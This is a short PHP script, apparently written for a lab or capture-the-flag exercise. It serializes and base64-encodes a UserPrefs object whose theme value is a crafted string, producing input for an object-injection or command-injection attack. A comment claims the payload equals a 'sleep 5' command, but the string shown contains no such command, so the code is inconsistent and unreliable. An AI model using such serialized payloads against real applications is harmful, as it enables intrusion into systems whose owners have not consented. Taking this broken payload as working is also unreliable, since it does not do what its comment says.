<?php
class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
        $this->theme = $theme;
    }
}

#payload is equal to sleep 5 command
$payload = "dark.css\"/> \"";

$up = new UserPrefs($payload);
$up_serialized = serialize($up);
$up_serialized_encoded = base64_encode($up_serialized);
echo($up_serialized_encoded);
?>